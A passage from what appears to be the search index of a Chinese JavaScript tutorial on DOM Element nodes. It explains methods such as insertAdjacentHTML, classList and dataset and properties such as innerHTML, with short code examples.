\u5143\u7d20\u663e\u793a\u4e3a6\u884c\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fd4\u56de\u516d\u4e2a\u6210\u5458\u3002 Element.insertAdjacentElement() \u00b6 Element.insertAdjacentElement \u65b9\u6cd5\u5728\u76f8\u5bf9\u4e8e\u5f53\u524d\u5143\u7d20\u7684\u6307\u5b9a\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u88ab\u63d2\u5165\u7684\u8282\u70b9\uff0c\u5982\u679c\u63d2\u5165\u5931\u8d25\uff0c\u8fd4\u56de null \u3002 1 element . insertAdjacentElement ( position , element ); Element.insertAdjacentElement \u65b9\u6cd5\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63d2\u5165\u7684\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5c06\u8981\u63d2\u5165\u7684\u8282\u70b9\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ea\u53ef\u4ee5\u53d6\u5982\u4e0b\u7684\u503c\u3002 beforebegin \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u524d afterbegin \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u524d\u9762 beforeend \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u540e\u9762 afterend \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u540e \u6ce8\u610f\uff0c beforebegin \u548c afterend \u8fd9\u4e24\u4e2a\u503c\uff0c\u53ea\u5728\u5f53\u524d\u8282\u70b9\u6709\u7236\u8282\u70b9\u65f6\u624d\u4f1a\u751f\u6548\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u662f\u7531\u811a\u672c\u521b\u5efa\u7684\uff0c\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u90a3\u4e48\u63d2\u5165\u4f1a\u5931\u8d25\u3002 1 2 3 var p1 = document . createElement ( 'p' ) var p2 = document . createElement ( 'p' ) p1 . insertAdjacentElement ( 'afterend' , p2 ) // null \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p1 \u6ca1\u6709\u7236\u8282\u70b9\uff0c\u6240\u4ee5\u63d2\u5165 p2 \u5230\u5b83\u540e\u9762\u5c31\u5931\u8d25\u4e86\u3002 \u5982\u679c\u63d2\u5165\u7684\u8282\u70b9\u662f\u4e00\u4e2a\u6587\u6863\u91cc\u73b0\u6709\u7684\u8282\u70b9\uff0c\u5b83\u4f1a\u4ece\u539f\u6709\u4f4d\u7f6e\u5220\u9664\uff0c\u653e\u7f6e\u5230\u65b0\u7684\u4f4d\u7f6e\u3002 Element.insertAdjacentHTML()\uff0cElement.insertAdjacentText() \u00b6 Element.insertAdjacentHTML \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a HTML \u5b57\u7b26\u4e32\uff0c\u89e3\u6790\u751f\u6210 DOM \u7ed3\u6784\uff0c\u63d2\u5165\u76f8\u5bf9\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6307\u5b9a\u4f4d\u7f6e\u3002 1 element . insertAdjacentHTML ( position , text ); \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u4e00\u4e2a\u8868\u793a\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5f85\u89e3\u6790\u7684 HTML \u5b57\u7b26\u4e32\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ea\u80fd\u8bbe\u7f6e\u4e0b\u9762\u56db\u4e2a\u503c\u4e4b\u4e00\u3002 beforebegin \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u524d afterbegin \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u524d\u9762 beforeend \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u540e\u9762 afterend \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u540e 1 2 3 4 5 // HTML \u4ee3\u7801\uff1a<div id=\"one\">one</div> var d1 = document . getElementById ( 'one' ); d1 . insertAdjacentHTML ( 'afterend' , '<div id=\"two\">two</div>' ); // \u6267\u884c\u540e\u7684 HTML \u4ee3\u7801\uff1a // <div id=\"one\">one</div><div id=\"two\">two</div> \u8be5\u65b9\u6cd5\u53ea\u662f\u5728\u73b0\u6709\u7684 DOM \u7ed3\u6784\u91cc\u9762\u63d2\u5165\u8282\u70b9\uff0c\u8fd9\u4f7f\u5f97\u5b83\u7684\u6267\u884c\u901f\u5ea6\u6bd4 innerHTML \u65b9\u6cd5\u5feb\u5f97\u591a\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u8f6c\u4e49 HTML \u5b57\u7b26\u4e32\uff0c\u8fd9\u5bfc\u81f4\u5b83\u4e0d\u80fd\u7528\u6765\u63d2\u5165\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u5426\u5219\u4f1a\u6709\u5b89\u5168\u98ce\u9669\u3002 Element.insertAdjacentText \u65b9\u6cd5\u5728\u76f8\u5bf9\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6307\u5b9a\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u7528\u6cd5\u4e0e Element.insertAdjacentHTML \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\uff1a<div id=\"one\">one</div> var d1 = document . getElementById ( 'one' ); d1 . insertAdjacentText ( 'afterend' , 'two' ); // \u6267\u884c\u540e\u7684 HTML \u4ee3\u7801\uff1a // <div id=\"one\">one</div>two Element.remove() \u00b6 Element.remove \u65b9\u6cd5\u7ee7\u627f\u81ea ChildNode \u63a5\u53e3\uff0c\u7528\u4e8e\u5c06\u5f53\u524d\u5143\u7d20\u8282\u70b9\u4ece\u5b83\u7684\u7236\u8282\u70b9\u79fb\u9664\u3002 1 2 var el = document . getElementById ( 'mydiv' ); el . remove (); \u4e0a\u9762\u4ee3\u7801\u5c06 el \u8282\u70b9\u4ece DOM \u6811\u91cc\u9762\u79fb\u9664\u3002 Element.focus()\uff0cElement.blur() \u00b6 Element.focus \u65b9\u6cd5\u7528\u4e8e\u5c06\u5f53\u524d\u9875\u9762\u7684\u7126\u70b9\uff0c\u8f6c\u79fb\u5230\u6307\u5b9a\u5143\u7d20\u4e0a\u3002 1 document . getElementById ( 'my-span' ). focus (); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u53c2\u6570\u5bf9\u8c61\u7684 preventScroll \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6307\u5b9a\u662f\u5426\u5c06\u5f53\u524d\u5143\u7d20\u505c\u7559\u5728\u539f\u59cb\u4f4d\u7f6e\uff0c\u800c\u4e0d\u662f\u6eda\u52a8\u5230\u53ef\u89c1\u533a\u57df\u3002 1 2 3 function getFocus () { document . getElementById ( 'btn' ). focus ({ preventScroll : false }); } \u4e0a\u9762\u4ee3\u7801\u4f1a\u8ba9 btn \u5143\u7d20\u83b7\u5f97\u7126\u70b9\uff0c\u5e76\u6eda\u52a8\u5230\u53ef\u89c1\u533a\u57df\u3002 \u6700\u540e\uff0c\u4ece document.activeElement \u5c5e\u6027\u53ef\u4ee5\u5f97\u5230\u5f53\u524d\u83b7\u5f97\u7126\u70b9\u7684\u5143\u7d20\u3002 Element.blur \u65b9\u6cd5\u7528\u4e8e\u5c06\u7126\u70b9\u4ece\u5f53\u524d\u5143\u7d20\u79fb\u9664\u3002 Element.click() \u00b6 Element.click \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u5143\u7d20\u4e0a\u6a21\u62df\u4e00\u6b21\u9f20\u6807\u70b9\u51fb\uff0c\u76f8\u5f53\u4e8e\u89e6\u53d1\u4e86 click \u4e8b\u4ef6\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Craig Buckler\uff0c How to Translate from DOM to SVG Coordinates and Back Again","title":"Element \u8282\u70b9"},{"location":"dom/element/#element","text":"","title":"Element \u8282\u70b9"},{"location":"dom/element/#_1","text":"Element \u8282\u70b9\u5bf9\u8c61\u5bf9\u5e94\u7f51\u9875\u7684 HTML \u5143\u7d20\u3002\u6bcf\u4e00\u4e2a HTML \u5143\u7d20\uff0c\u5728 DOM \u6811\u4e0a\u90fd\u4f1a\u8f6c\u5316\u6210\u4e00\u4e2a Element \u8282\u70b9\u5bf9\u8c61\uff08\u4ee5\u4e0b\u7b80\u79f0\u5143\u7d20\u8282\u70b9\uff09\u3002 \u5143\u7d20\u8282\u70b9\u7684 nodeType \u5c5e\u6027\u90fd\u662f 1 \u3002 1 2 3 var p = document . querySelector ( 'p' ); p . nodeName // \"P\" p . nodeType // 1 Element \u5bf9\u8c61\u7ee7\u627f\u4e86 Node \u63a5\u53e3\uff0c\u56e0\u6b64 Node \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5728 Element \u5bf9\u8c61\u90fd\u5b58\u5728\u3002 \u6b64\u5916\uff0c\u4e0d\u540c\u7684 HTML \u5143\u7d20\u5bf9\u5e94\u7684\u5143\u7d20\u8282\u70b9\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6d4f\u89c8\u5668\u4f7f\u7528\u4e0d\u540c\u7684\u6784\u9020\u51fd\u6570\uff0c\u751f\u6210\u4e0d\u540c\u7684\u5143\u7d20\u8282\u70b9\uff0c\u6bd4\u5982 <a> \u5143\u7d20\u7684\u6784\u9020\u51fd\u6570\u662f HTMLAnchorElement() \uff0c <button> \u662f HTMLButtonElement() \u3002\u56e0\u6b64\uff0c\u5143\u7d20\u8282\u70b9\u4e0d\u662f\u4e00\u79cd\u5bf9\u8c61\uff0c\u800c\u662f\u8bb8\u591a\u79cd\u5bf9\u8c61\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u9664\u4e86\u7ee7\u627f Element \u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u8fd8\u6709\u5404\u81ea\u72ec\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002","title":"\u7b80\u4ecb"},{"location":"dom/element/#_2","text":"","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"dom/element/#_3","text":"\uff081\uff09Element.id Element.id \u5c5e\u6027\u8fd4\u56de\u6307\u5b9a\u5143\u7d20\u7684 id \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 1 2 3 // HTML \u4ee3\u7801\u4e3a <p id=\"foo\"> var p = document . querySelector ( 'p' ); p . id // \"foo\" \u6ce8\u610f\uff0c id \u5c5e\u6027\u7684\u503c\u662f\u5927\u5c0f\u5199\u654f\u611f\uff0c\u5373\u6d4f\u89c8\u5668\u80fd\u6b63\u786e\u8bc6\u522b <p id=\"foo\"> \u548c <p id=\"FOO\"> \u8fd9\u4e24\u4e2a\u5143\u7d20\u7684 id \u5c5e\u6027\uff0c\u4f46\u662f\u6700\u597d\u4e0d\u8981\u8fd9\u6837\u547d\u540d\u3002 \uff082\uff09Element.tagName Element.tagName \u5c5e\u6027\u8fd4\u56de\u6307\u5b9a\u5143\u7d20\u7684\u5927\u5199\u6807\u7b7e\u540d\uff0c\u4e0e nodeName \u5c5e\u6027\u7684\u503c\u76f8\u7b49\u3002 1 2 3 4 5 // HTML\u4ee3\u7801\u4e3a // <span id=\"myspan\">Hello</span> var span = document . getElementById ( 'myspan' ); span . id // \"myspan\" span . tagName // \"SPAN\" \uff083\uff09Element.dir Element.dir \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u5f53\u524d\u5143\u7d20\u7684\u6587\u5b57\u65b9\u5411\uff0c\u53ef\u80fd\u662f\u4ece\u5de6\u5230\u53f3\uff08 \"ltr\" \uff09\uff0c\u4e5f\u53ef\u80fd\u662f\u4ece\u53f3\u5230\u5de6\uff08 \"rtl\" \uff09\u3002 \uff084\uff09Element.accessKey Element.accessKey \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u5206\u914d\u7ed9\u5f53\u524d\u5143\u7d20\u7684\u5feb\u6377\u952e\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <button accesskey=\"h\" id=\"btn\">\u70b9\u51fb</button> var btn = document . getElementById ( 'btn' ); btn . accessKey // \"h\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c btn \u5143\u7d20\u7684\u5feb\u6377\u952e\u662f h \uff0c\u6309\u4e0b Alt + h \u5c31\u80fd\u5c06\u7126\u70b9\u8f6c\u79fb\u5230\u5b83\u4e0a\u9762\u3002 \uff085\uff09Element.draggable Element.draggable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u662f\u5426\u53ef\u62d6\u52a8\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff086\uff09Element.lang Element.lang \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u8bed\u8a00\u8bbe\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 1 2 3 // HTML \u4ee3\u7801\u5982\u4e0b // <html lang=\"en\"> document . documentElement . lang // \"en\" \uff087\uff09Element.tabIndex Element.tabIndex \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u5728 Tab \u952e\u904d\u5386\u65f6\u7684\u987a\u5e8f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 tabIndex \u5c5e\u6027\u503c\u5982\u679c\u662f\u8d1f\u503c\uff08\u901a\u5e38\u662f -1 \uff09\uff0c\u5219 Tab \u952e\u4e0d\u4f1a\u904d\u5386\u5230\u8be5\u5143\u7d20\u3002\u5982\u679c\u662f\u6b63\u6574\u6570\uff0c\u5219\u6309\u7167\u987a\u5e8f\uff0c\u4ece\u5c0f\u5230\u5927\u904d\u5386\u3002\u5982\u679c\u4e24\u4e2a\u5143\u7d20\u7684 tabIndex \u5c5e\u6027\u7684\u6b63\u6574\u6570\u503c\u76f8\u540c\uff0c\u5219\u6309\u7167\u51fa\u73b0\u7684\u987a\u5e8f\u904d\u5386\u3002\u904d\u5386\u5b8c\u6240\u6709 tabIndex \u4e3a\u6b63\u6574\u6570\u7684\u5143\u7d20\u4ee5\u540e\uff0c\u518d\u904d\u5386\u6240\u6709 tabIndex \u7b49\u4e8e 0 \u3001\u6216\u8005\u5c5e\u6027\u503c\u662f\u975e\u6cd5\u503c\u3001\u6216\u8005\u6ca1\u6709 tabIndex \u5c5e\u6027\u7684\u5143\u7d20\uff0c\u987a\u5e8f\u4e3a\u5b83\u4eec\u5728\u7f51\u9875\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u3002 \uff088\uff09Element.title Element.title \u5c5e\u6027\u7528\u6765\u8bfb\u5199\u5f53\u524d\u5143\u7d20\u7684 HTML \u5c5e\u6027 title \u3002\u8be5\u5c5e\u6027\u901a\u5e38\u7528\u6765\u6307\u5b9a\uff0c\u9f20\u6807\u60ac\u6d6e\u65f6\u5f39\u51fa\u7684\u6587\u5b57\u63d0\u793a\u6846\u3002","title":"\u5143\u7d20\u7279\u6027\u7684\u76f8\u5173\u5c5e\u6027"},{"location":"dom/element/#_4","text":"\uff081\uff09Element.hidden Element.hidden \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d HTML \u5143\u7d20\u7684 hidden \u5c5e\u6027\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u7528\u6765\u63a7\u5236\u5f53\u524d\u5143\u7d20\u662f\u5426\u53ef\u89c1\u3002 1 2 3 4 5 6 var btn = document . getElementById ( 'btn' ); var mydiv = document . getElementById ( 'mydiv' ); btn . addEventListener ( 'click' , function () { mydiv . hidden = ! mydiv . hidden ; }, false ); \u6ce8\u610f\uff0c\u8be5\u5c5e\u6027\u4e0e CSS \u8bbe\u7f6e\u662f\u4e92\u76f8\u72ec\u7acb\u7684\u3002CSS \u5bf9\u5f53\u524d\u5143\u7d20\u53ef\u89c1\u6027\u7684\u8bbe\u7f6e\uff0c Element.hidden \u5e76\u4e0d\u80fd\u53cd\u6620\u51fa\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u5e76\u4e0d\u80fd\u7528\u6765\u5224\u65ad\u5f53\u524d\u5143\u7d20\u7684\u5b9e\u9645\u53ef\u89c1\u6027\u3002 CSS \u8bbe\u7f6e\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e Element.hidden \u3002\u5982\u679c CSS \u6307\u5b9a\u4e86\u8be5\u5143\u7d20\u4e0d\u53ef\u89c1\uff08 display: none \uff09\u6216\u53ef\u89c1\uff08 visibility: visible \uff09\uff0c\u90a3\u4e48 Element.hidden \u5e76\u4e0d\u80fd\u6539\u53d8\u8be5\u5143\u7d20\u5b9e\u9645\u7684\u53ef\u89c1\u6027\u3002\u6362\u8a00\u4e4b\uff0c\u8fd9\u4e2a\u5c5e\u6027\u53ea\u5728 CSS \u6ca1\u6709\u660e\u786e\u8bbe\u5b9a\u5f53\u524d\u5143\u7d20\u7684\u53ef\u89c1\u6027\u65f6\u624d\u6709\u6548\u3002 \uff082\uff09Element.contentEditable\uff0cElement.isContentEditable HTML \u5143\u7d20\u53ef\u4ee5\u8bbe\u7f6e contentEditable \u5c5e\u6027\uff0c\u4f7f\u5f97\u5143\u7d20\u7684\u5185\u5bb9\u53ef\u4ee5\u7f16\u8f91\u3002 1 < div contenteditable > 123 </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <div> \u5143\u7d20\u6709 contenteditable \u5c5e\u6027\uff0c\u56e0\u6b64\u7528\u6237\u53ef\u4ee5\u5728\u7f51\u9875\u4e0a\u7f16\u8f91\u8fd9\u4e2a\u533a\u5757\u7684\u5185\u5bb9\u3002 Element.contentEditable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 contenteditable \u5c5e\u6027\uff0c\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u5199\u3002 \"true\" \uff1a\u5143\u7d20\u5185\u5bb9\u53ef\u7f16\u8f91 \"false\" \uff1a\u5143\u7d20\u5185\u5bb9\u4e0d\u53ef\u7f16\u8f91 \"inherit\" \uff1a\u5143\u7d20\u662f\u5426\u53ef\u7f16\u8f91\uff0c\u7ee7\u627f\u4e86\u7236\u5143\u7d20\u7684\u8bbe\u7f6e Element.isContentEditable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u540c\u6837\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 contenteditable \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002","title":"\u5143\u7d20\u72b6\u6001\u7684\u76f8\u5173\u5c5e\u6027"},{"location":"dom/element/#elementattributes","text":"Element.attributes \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u8282\u70b9\uff0c\u8be6\u89c1\u300a\u5c5e\u6027\u7684\u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 6 var p = document . querySelector ( 'p' ); var attrs = p . attributes ; for ( var i = attrs . length - 1 ; i >= 0 ; i -- ) { console . log ( attrs [ i ]. name + '->' + attrs [ i ]. value ); } \u4e0a\u9762\u4ee3\u7801\u904d\u5386 p \u5143\u7d20\u7684\u6240\u6709\u5c5e\u6027\u3002","title":"Element.attributes"},{"location":"dom/element/#elementclassnameelementclasslist","text":"className \u5c5e\u6027\u7528\u6765\u8bfb\u5199\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684 class \u5c5e\u6027\u3002\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a class \u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u5272\u3002 classList \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6bcf\u4e2a class \u5c31\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // HTML \u4ee3\u7801 <div class=\"one two three\" id=\"myDiv\"></div> var div = document . getElementById ( 'myDiv' ); div . className // \"one two three\" div . classList // { // 0: \"one\" // 1: \"two\" // 2: \"three\" // length: 3 // } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c className \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7a7a\u683c\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u800c classList \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684 length \u5c5e\u6027\uff08\u53ea\u8bfb\uff09\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684 class \u6570\u91cf\u3002 classList \u5bf9\u8c61\u6709\u4e0b\u5217\u65b9\u6cd5\u3002 add() \uff1a\u589e\u52a0\u4e00\u4e2a class\u3002 remove() \uff1a\u79fb\u9664\u4e00\u4e2a class\u3002 contains() \uff1a\u68c0\u67e5\u5f53\u524d\u5143\u7d20\u662f\u5426\u5305\u542b\u67d0\u4e2a class\u3002 toggle() \uff1a\u5c06\u67d0\u4e2a class \u79fb\u5165\u6216\u79fb\u51fa\u5f53\u524d\u5143\u7d20\u3002 item() \uff1a\u8fd4\u56de\u6307\u5b9a\u7d22\u5f15\u4f4d\u7f6e\u7684 class\u3002 toString() \uff1a\u5c06 class \u7684\u5217\u8868\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 var div = document . getElementById ( 'myDiv' ); div . classList . add ( 'myCssClass' ); div . classList . add ( 'foo' , 'bar' ); div . classList . remove ( 'myCssClass' ); div . classList . toggle ( 'myCssClass' ); // \u5982\u679c myCssClass \u4e0d\u5b58\u5728\u5c31\u52a0\u5165\uff0c\u5426\u5219\u79fb\u9664 div . classList . contains ( 'myCssClass' ); // \u8fd4\u56de true \u6216\u8005 false div . classList . item ( 0 ); // \u8fd4\u56de\u7b2c\u4e00\u4e2a Class div . classList . toString (); \u4e0b\u9762\u6bd4\u8f83\u4e00\u4e0b\uff0c className \u548c classList \u5728\u6dfb\u52a0\u548c\u5220\u9664\u67d0\u4e2a class \u65f6\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 var foo = document . getElementById ( 'foo' ); // \u6dfb\u52a0class foo . className += 'bold' ; foo . classList . add ( 'bold' ); // \u5220\u9664class foo . classList . remove ( 'bold' ); foo . className = foo . className . replace ( /^bold$/ , '' ); toggle \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u5982\u679c\u4e3a true \uff0c\u5219\u6dfb\u52a0\u8be5\u5c5e\u6027\uff1b\u5982\u679c\u4e3a false \uff0c\u5219\u53bb\u9664\u8be5\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 el . classList . toggle ( 'abc' , boolValue ); // \u7b49\u540c\u4e8e if ( boolValue ) { el . classList . add ( 'abc' ); } else { el . classList . remove ( 'abc' ); }","title":"Element.className\uff0cElement.classList"},{"location":"dom/element/#elementdataset","text":"\u7f51\u9875\u5143\u7d20\u53ef\u4ee5\u81ea\u5b9a\u4e49 data- \u5c5e\u6027\uff0c\u7528\u6765\u6dfb\u52a0\u6570\u636e\u3002 1 < div data-timestamp = \"1522907809292\" ></ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <div> \u5143\u7d20\u6709\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 data-timestamp \u5c5e\u6027\uff0c\u7528\u6765\u4e3a\u8be5\u5143\u7d20\u6dfb\u52a0\u4e00\u4e2a\u65f6\u95f4\u6233\u3002 Element.dataset \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4ece\u8fd9\u4e2a\u5bf9\u8c61\u8bfb\u5199 data- \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 // <article // id=\"foo\" // data-columns=\"3\" // data-index-number=\"12314\" // data-parent=\"cars\"> // ... // </article> var article = document . getElementById ( 'foo' ); article . dataset . columns // \"3\" article . dataset . indexNumber // \"12314\" article . dataset . parent // \"cars\" \u6ce8\u610f\uff0c dataset \u4e0a\u9762\u7684\u5404\u4e2a\u5c5e\u6027\u8fd4\u56de\u90fd\u662f\u5b57\u7b26\u4e32\u3002 HTML \u4ee3\u7801\u4e2d\uff0c data- \u5c5e\u6027\u7684\u5c5e\u6027\u540d\uff0c\u53ea\u80fd\u5305\u542b\u82f1\u6587\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u8fde\u8bcd\u7ebf\uff08 - \uff09\u3001\u70b9\uff08 . \uff09\u3001\u5192\u53f7\uff08 : \uff09\u548c\u4e0b\u5212\u7ebf\uff08 _ \uff09\u3002\u5b83\u4eec\u8f6c\u6210 JavaScript \u5bf9\u5e94\u7684 dataset \u5c5e\u6027\u540d\uff0c\u89c4\u5219\u5982\u4e0b\u3002 \u5f00\u5934\u7684 data- \u4f1a\u7701\u7565\u3002 \u5982\u679c\u8fde\u8bcd\u7ebf\u540e\u9762\u8ddf\u4e86\u4e00\u4e2a\u82f1\u6587\u5b57\u6bcd\uff0c\u90a3\u4e48\u8fde\u8bcd\u7ebf\u4f1a\u53d6\u6d88\uff0c\u8be5\u5b57\u6bcd\u53d8\u6210\u5927\u5199\u3002 \u5176\u4ed6\u5b57\u7b26\u4e0d\u53d8\u3002 \u56e0\u6b64\uff0c data-abc-def \u5bf9\u5e94 dataset.abcDef \uff0c data-abc-1 \u5bf9\u5e94 dataset[\"abc-1\"] \u3002 \u9664\u4e86\u4f7f\u7528 dataset \u8bfb\u5199 data- \u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Element.getAttribute() \u548c Element.setAttribute() \uff0c\u901a\u8fc7\u5b8c\u6574\u7684\u5c5e\u6027\u540d\u8bfb\u5199\u8fd9\u4e9b\u5c5e\u6027\u3002 1 2 3 4 var mydiv = document . getElementById ( 'mydiv' ); mydiv . dataset . foo = 'bar' ; mydiv . getAttribute ( 'data-foo' ) // \"bar\"","title":"Element.dataset"},{"location":"dom/element/#elementinnerhtml","text":"Element.innerHTML \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e\u8be5\u5143\u7d20\u5305\u542b\u7684\u6240\u6709 HTML \u4ee3\u7801\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u5e38\u7528\u6765\u8bbe\u7f6e\u67d0\u4e2a\u8282\u70b9\u7684\u5185\u5bb9\u3002\u5b83\u80fd\u6539\u5199\u6240\u6709\u5143\u7d20\u8282\u70b9\u7684\u5185\u5bb9\uff0c\u5305\u62ec <HTML> \u548c <body> \u5143\u7d20\u3002 \u5982\u679c\u5c06 innerHTML \u5c5e\u6027\u8bbe\u4e3a\u7a7a\uff0c\u7b49\u4e8e\u5220\u9664\u6240\u6709\u5b83\u5305\u542b\u7684\u6240\u6709\u8282\u70b9\u3002 1 el . innerHTML = '' ; \u4e0a\u9762\u4ee3\u7801\u7b49\u4e8e\u5c06 el \u8282\u70b9\u53d8\u6210\u4e86\u4e00\u4e2a\u7a7a\u8282\u70b9\uff0c el \u539f\u6765\u5305\u542b\u7684\u8282\u70b9\u88ab\u5168\u90e8\u5220\u9664\u3002 \u6ce8\u610f\uff0c\u8bfb\u53d6\u5c5e\u6027\u503c\u7684\u65f6\u5019\uff0c\u5982\u679c\u6587\u672c\u8282\u70b9\u5305\u542b & \u3001\u5c0f\u4e8e\u53f7\uff08 < \uff09\u548c\u5927\u4e8e\u53f7\uff08 > \uff09\uff0c innerHTML \u5c5e\u6027\u4f1a\u5c06\u5b83\u4eec\u8f6c\u4e3a\u5b9e\u4f53\u5f62\u5f0f &amp; \u3001 &lt; \u3001 &gt; 